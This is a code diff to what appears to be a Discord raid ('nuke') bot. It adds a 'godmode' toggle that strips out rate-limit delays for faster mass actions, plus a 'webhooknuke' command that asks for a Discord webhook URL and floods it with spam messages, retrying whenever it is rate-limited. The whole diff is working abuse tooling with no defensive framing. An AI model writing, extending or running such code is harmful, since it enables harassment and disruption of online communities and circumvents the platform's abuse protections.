@@ -431,7 +431,12 @@ async def mass_exec(items, op, label, batch=30):
         return 0, 0
     ok = 0
     fail = 0
-    effective_batch = 3 if SAFE_MODE else batch
+    if GOD_MODE:
+        effective_batch = 50
+    elif SAFE_MODE:
+        effective_batch = 3
+    else:
+        effective_batch = batch
     safe_delay = 1.2 if SAFE_MODE else 0
     for i in range(0, total, effective_batch):
         chunk = items[i : i + effective_batch]
@@ -441,9 +446,11 @@ async def mass_exec(items, op, label, batch=30):
                 fail += 1
             else:
                 ok += 1
-        if SAFE_MODE and safe_delay > 0:
+        if SAFE_MODE and safe_delay > 0 and not GOD_MODE:
             await asyncio.sleep(safe_delay)
-    if SAFE_MODE:
+    if GOD_MODE:
+        log(f"[GOD] {label}: {ok}/{total} done ({fail} failed)", "magenta")
+    elif SAFE_MODE:
         log(f"[SAFE] {label}: {ok}/{total} done ({fail} failed)", "cyan")
     else:
         log(f"{label}: {ok}/{total} done ({fail} failed)", "ok")
@@ -558,6 +565,7 @@ async def on_message(message):
 NUKE_RUNNING = False
 NUKE_TASK = None
 SAFE_MODE = False
+GOD_MODE = False
 
 
 # ============================================================
@@ -590,6 +598,8 @@ def show_idiot_commands():
     print(f"  {Fore.LIGHTCYAN_EX}serverinfo [server_id]{Fore.RESET}  - Show server information")
     print(f"  {Fore.LIGHTCYAN_EX}reload{Fore.RESET}                 - Reload config from disk")
     print(f"  {Fore.LIGHTCYAN_EX}safemode{Fore.RESET}                 - Toggle safe mode (anti-ratelimit)")
+    print(f"  {Fore.LIGHTCYAN_EX}godmode{Fore.RESET}                  - Toggle GOD MODE (max speed, batch 50)")
+    print(f"  {Fore.LIGHTCYAN_EX}webhooknuke / wn{Fore.RESET}        - Nuke a webhook (asks for URL)")
     print(f"  {Fore.LIGHTCYAN_EX}stopnuke{Fore.RESET}                - Cancel a running background nuke")
     print(f"  {Fore.LIGHTCYAN_EX}birdseye / be{Fore.RESET}          - Switch to BIRDS EYE VIEW (live monitor)")
     print(f"  {Fore.LIGHTCYAN_EX}shutdown{Fore.RESET}               - Shut down the bot")
@@ -603,7 +613,7 @@ def show_idiot_commands():
 
 async def idiot_mode_loop():
     """Loop that reads commands from console and executes them."""
-    global NUKE_RUNNING, NUKE_TASK
+    global NUKE_RUNNING, NUKE_TASK, SAFE_MODE, GOD_MODE
     await asyncio.sleep(1)  # Let on_ready finish printing
 
     def reader():
@@ -697,10 +707,21 @@ async def idiot_mode_loop():
                 log("Webhook spammer not initialized.", "info")
 
         elif cmd_name == "safemode":
-            global SAFE_MODE
             SAFE_MODE = not SAFE_MODE
+            GOD_MODE = False
             mode = "ON" if SAFE_MODE else "OFF"
             log(f"SAFE MODE {mode} {'- Reduced speed, no ratelimits' if SAFE_MODE else '- Full speed'}", "cyan" if SAFE_MODE else "warn")
+
+        elif cmd_name == "godmode":
+            GOD_MODE = not GOD_MODE
+            if GOD_MODE:
+                SAFE_MODE = False
+                log("GODMODE ON - Max speed, batch 50, no delays. RIP rate limits.", "magenta")
+            else:
+                log("GODMODE OFF", "warn")
+
+        elif cmd_name == "webhooknuke" or cmd_name == "wn":
+            await webhook_nuke()
 
         elif cmd_name == "birdseye" or cmd_name == "be":
             await switch_to_birdseye(server_id)
@@ -1000,6 +1021,52 @@ async def start_background_nuke(cmd_name, guild):
             NUKE_TASK = None
 
     NUKE_TASK = asyncio.create_task(_nuke_task())
+
+
+async def webhook_nuke():
+    """Nuke a webhook - asks for URL each time, spams it to death."""
+    def read_url():
+        return input(f"{Fore.MAGENTA}  Webhook URL > {Fore.RESET}").strip()
+
+    url = await asyncio.get_event_loop().run_in_executor(None, read_url)
+    if not url or "discord.com/api/webhooks/" not in url:
+        log("Invalid webhook URL.", "err")
+        return
+
+    def read_msg():
+        return input(f"{Fore.MAGENTA}  Spam message (enter for default) > {Fore.RESET}").strip()
+
+    msg = await asyncio.get_event_loop().run_in_executor(None, read_msg)
+    if not msg:
+        msg = random.choice(SPAM_MESSAGES)
+
+    def read_count():
+        try:
+            return int(input(f"{Fore.MAGENTA}  How many messages? > {Fore.RESET}").strip())
+        except ValueError:
+            return 50
+
+    count = await asyncio.get_event_loop().run_in_executor(None, read_count)
+
+    log(f"WEBHOOK NUKE: {count} messages to webhook", "warn")
+    session = await get_http()
+    sent = 0
+    errors = 0
+    for i in range(count):
+        try:
+            async with session.post(url, json={"content": msg, "username": "AbilityV2"}) as resp:
+                if resp.status == 429:
+                    retry = float(resp.headers.get("Retry-After", 2))
+                    await asyncio.sleep(retry)
+                elif resp.status in (200, 204):
+                    sent += 1
+                else:
+                    errors += 1
+        except Exception:
+            errors += 1
+        await asyncio.sleep(0.01)
+
+    log(f"Webhook nuke done: {sent} sent, {errors} errors", "ok")
 
 
 async def execute_on_guild(cmd_name, server_id=None):
